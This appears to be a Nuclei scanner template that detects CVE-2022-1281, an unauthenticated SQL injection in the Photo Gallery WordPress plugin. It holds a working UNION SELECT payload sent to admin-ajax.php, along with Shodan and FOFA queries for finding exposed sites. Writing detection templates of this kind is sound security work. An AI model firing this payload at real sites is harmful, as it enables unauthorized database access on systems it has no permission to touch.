id: CVE-2022-1281

info:
  name: Unauthenticated SQL Injection in Photo Gallery WordPress Plugin
  author: ProjectDiscoveryAI
  severity: critical
  description: The Photo Gallery WordPress plugin through 1.6.3 does not properly escape the $_POST['filter_tag'] parameter, which is appended to an SQL query, making SQL Injection attacks possible.
  impact: |
    Successful exploitation could lead to unauthorized access to sensitive data or complete compromise of the WordPress site.
  remediation: |
    Update the Photo Gallery WordPress Plugin to the latest patched version to mitigate the SQL Injection vulnerability.
  reference:
    - https://wpscan.com/vulnerability/2b4866f2-f511-41c6-8135-cf1e0263d8de
    - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-1281
    cwe-id: CWE-89
    epss-score: 0.0017
    epss-percentile: 0.55093
    cpe: cpe:2.3:a:10web:photo_gallery:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: 10web
    product: photo_gallery
    framework: wordpress
    shodan-query: http.html:"/wp-content/plugins/photo-gallery"
    fofa-query: body=/wp-content/plugins/photo-gallery
    publicwww-query: /wp-content/plugins/photo-gallery
  tags: wpscan

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    headers:
      Accept: "application/json, text/javascript, */*; q=0.01"
      Accept-Language: "zh,en;q=0.5"
      Accept-Encoding: "gzip, deflate"
      Content-Type: "application/x-www-form-urlencoded; charset=UTF-8"
      X-Requested-With: "XMLHttpRequest"
      Content-Length: "490"
      Connection: "close"

    body: |
      action=GalleryBox&filter_tag=1)" union select * from (select 123)a1 join (select 2)a2 join (select 3)a3 join (select 2)a4 join (select 2)a5  join (select 2)a6 join (select 2)a7 join (select 2)a8 join (select 2)a9 join (select 2)a10 join (select 2)a11 join (select 2)a12 join (select 2)a13 join (select 2)a14 join (select 2)a15 join (select 2)a16 join (select 2)a17 join (select 2)a18 join (select version())a19 join (select 2)a20 join (select 2)a21 join (select 2)a22 join (select 2)a23-- -
    matchers:
      - type: word
        words:
          - "syntax error"
          - "unrecognized token"
          - "SQL syntax"
        part: body
        condition: or
